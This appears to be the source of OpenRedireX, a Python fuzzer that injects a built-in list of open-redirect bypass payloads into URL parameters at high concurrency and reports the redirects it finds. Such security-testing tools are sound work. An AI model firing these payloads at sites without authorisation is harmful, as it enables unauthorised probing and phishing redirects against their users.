#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import sys
import socket
import random
from aiohttp import ClientConnectorError, ClientOSError, ServerDisconnectedError, ServerTimeoutError, ServerConnectionError, TooManyRedirects
from tqdm import tqdm
import concurrent.futures
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from typing import List


# Color constants
LIGHT_GREEN = '\033[92m'  # Light Green
DARK_GREEN = '\033[32m'   # Dark Green
ENDC = '\033[0m'          # Reset to default color

redirect_payloads = [
    # Scheme-relative and slash confusion
    "//example.com",
    "///example.com",
    "////example.com",
    "/////example.com",
    "////example.com/",
    "//example.com/",
    "//example.com/%2f..",
    "//example.com/%2f%2e%2e",
    "//example.com/%2e%2e",
    "//example.com/%252f..",
    "//example.com/%252e%252e",
    "/%2f%2fexample.com",
    "/%2f%2fexample.com/",
    "/%2F%2Fexample.com/%2e%2e",
    "/%5cexample.com",
    "/%5c%5cexample.com",
    "/\\example.com",
    "/\\\\example.com",
    "/./example.com",
    "/../example.com",
    "/.example.com",
    "/..;/example.com",
    "/;/example.com",
    "/%2e/example.com",
    "/%2e%2e/example.com",
    "/%2e%2e%2fexample.com",
    "/%2e%2e%5cexample.com",
    # Scheme confusion and mixed slash payloads
    "http://example.com",
    "https://example.com",
    "https:/example.com",
    "http:/example.com",
    "/http://example.com",
    "/https://example.com",
    "/https://example.com/",
    "/https://example.com/%2e%2e",
    "/https://example.com/%2f..",
    "/https://example.com//",
    "/https:///example.com",
    "/https:///example.com/%2e%2e",
    "/https:///example.com/%2f%2e%2e",
    "/https:example.com",
    "/https:/%5cexample.com/",
    "/https://%5cexample.com",
    "/https://%09/example.com",
    # Userinfo and delimiter abuse
    "//example.com@google.com/%2f..",
    "///example.com@google.com/%2f..",
    "https://example.com@google.com/%2f..",
    "/https://example.com@google.com/%2f..",
    "//example.com@google.com/%2f%2e%2e",
    "///example.com@google.com/%2f%2e%2e",
    "//example.com%40google.com",
    "//example.com%2F@google.com",
    "//example.com%23@google.com",
    "//example.com%3f@google.com",
    "////\\;@example.com",
    "////;@example.com",
    "//google.com/%2f..",
    "///google.com/%2f..",
    "////google.com/%2f..",
    "https://google.com/%2f..",
    "/https://google.com/%2f..",
    "//google.com/%2f%2e%2e",
    "///google.com/%2f%2e%2e",
    "////google.com/%2f%2e%2e",
    # Tab/newline/control-char variations
    "//%09/example.com",
    "///%09/example.com",
    "////%09/example.com",
    "//%0d%0a/example.com",
    "/%09/example.com",
    "/%0d/example.com",
    "/%0a/example.com",
    # Query/fragment tricks used in redirect sinks
    "//example.com#",
    "//example.com/%23",
    "//example.com?#",
    "//example.com?next=/",
    "//example.com?redirect=/",
    "https://example.com#@google.com",
    "https://example.com?@google.com",
    "https://example.com/%09@google.com",
]

RANDOM_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
]

def normalize_external_server(external_server: str) -> str:
    candidate = external_server.strip()
    if not candidate:
        raise ValueError("external server cannot be empty")

    if "://" in candidate:
        parsed = urlparse(candidate)
        candidate = parsed.netloc

    candidate = candidate.split("/")[0].strip()
    if not candidate:
        raise ValueError("external server must include a host")

    return candidate


def apply_external_server(payloads: List[str], external_server: str) -> List[str]:
    return [payload.replace("example.com", external_server) for payload in payloads]


async def load_payloads(payloads_file, external_server):
    if payloads_file:
        with open(payloads_file) as f:
            payloads = [line.strip() for line in f if line.strip()]
            return apply_external_server(payloads, external_server)

    return apply_external_server(redirect_payloads, external_server)


def fuzzify_url(url: str, keyword: str) -> str:
    # If the keyword is already in the url, return the url as is.
    if keyword in url:
        return url

    # Otherwise, replace all parameter values with the keyword.
    parsed_url = urlparse(url)
    params = parse_qsl(parsed_url.query)
    fuzzed_params = [(k, keyword) for k, _ in params]
    fuzzed_query = urlencode(fuzzed_params)

    # Construct the fuzzified url.
    fuzzed_url = urlunparse(
        [parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, fuzzed_query, parsed_url.fragment])

    return fuzzed_url


def load_urls() -> List[str]:
    urls = []
    for line in sys.stdin:
        url = line.strip()
        fuzzed_url = fuzzify_url(url, "FUZZ")
        urls.append(fuzzed_url)
    return urls



async def fetch_url(session, url):
    try:
        async with session.head(url, allow_redirects=True, timeout=10) as response:
            return response
    except (ClientConnectorError, ClientOSError, ServerDisconnectedError, ServerTimeoutError, ServerConnectionError, TooManyRedirects, UnicodeDecodeError, socket.gaierror, asyncio.exceptions.TimeoutError):
        tqdm.write(f'[ERROR] Error fetching: {url}', file=sys.stderr)
        return None

async def process_url(semaphore, session, url, payloads, keyword, pbar):
    async with semaphore:
        for payload in payloads:
            filled_url = url.replace(keyword, payload)
            response = await fetch_url(session, filled_url)
            if response and response.history:
                locations = " --> ".join(str(r.url) for r in response.history)
                # If the string contains "-->", print in green
                if "-->" in locations:
                    tqdm.write(f'{DARK_GREEN}[FOUND]{ENDC} {LIGHT_GREEN}{filled_url} redirects to {locations}{ENDC}')
                else:
                    tqdm.write(f'[INFO] {filled_url} redirects to {locations}')
            pbar.update()

async def process_urls(semaphore, session, urls, payloads, keyword):
    with tqdm(total=len(urls) * len(payloads), ncols=70, desc='Processing', unit='url', position=0) as pbar:
        tasks = []
        for url in urls:
            tasks.append(process_url(semaphore, session, url, payloads, keyword, pbar))
        await asyncio.gather(*tasks, return_exceptions=True)

async def main(args):
    payloads = await load_payloads(args.payloads, args.external_server)
    urls = load_urls()
    tqdm.write(f'[INFO] Processing {len(urls)} URLs with {len(payloads)} payloads.')
    selected_user_agent = None
    if args.user_agent:
        selected_user_agent = args.user_agent.strip()
    elif args.random_agent:
        selected_user_agent = random.choice(RANDOM_USER_AGENTS)

    session_kwargs = {}
    if selected_user_agent:
        session_kwargs["headers"] = {"User-Agent": selected_user_agent}
        tqdm.write(f'[INFO] Using User-Agent: {selected_user_agent}')

    async with aiohttp.ClientSession(**session_kwargs) as session:
        semaphore = asyncio.Semaphore(args.concurrency)
        await process_urls(semaphore, session, urls, payloads, args.keyword)

if __name__ == "__main__":
    banner = """
   ____                   ____           ___               
  / __ \____  ___  ____  / __ \___  ____/ (_)_______  _  __
 / / / / __ \/ _ \/ __ \/ /_/ / _ \/ __  / / ___/ _ \| |/_/
/ /_/ / /_/ /  __/ / / / _, _/  __/ /_/ / / /  /  __/>  <  
\____/ .___/\___/_/ /_/_/ |_|\___/\__,_/_/_/   \___/_/|_|  
    /_/                                                    

    """
    print(banner)
    parser = argparse.ArgumentParser(description="OpenRedireX : A fuzzer for detecting open redirect vulnerabilities")
    parser.add_argument('-p', '--payloads', help='file of payloads', required=False)
    parser.add_argument('-k', '--keyword', help='keyword in urls to replace with payload (default is FUZZ)', default="FUZZ")
    parser.add_argument('-c', '--concurrency', help='number of concurrent tasks (default is 100)', type=int, default=100)
    parser.add_argument(
        '--external-server',
        help='external server hostname to inject into payloads (default: example.com)',
        default='example.com',
    )
    user_agent_group = parser.add_mutually_exclusive_group()
    user_agent_group.add_argument('--user-agent', help='set a custom User-Agent header')
    user_agent_group.add_argument('--random-agent', action='store_true', help='pick a random User-Agent header for this run')
    args = parser.parse_args()
    if args.user_agent is not None and not args.user_agent.strip():
        parser.error('--user-agent cannot be empty')
    try:
        args.external_server = normalize_external_server(args.external_server)
    except ValueError as error:
        parser.error(f'--external-server {error}')
    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting...")
        sys.exit(0)
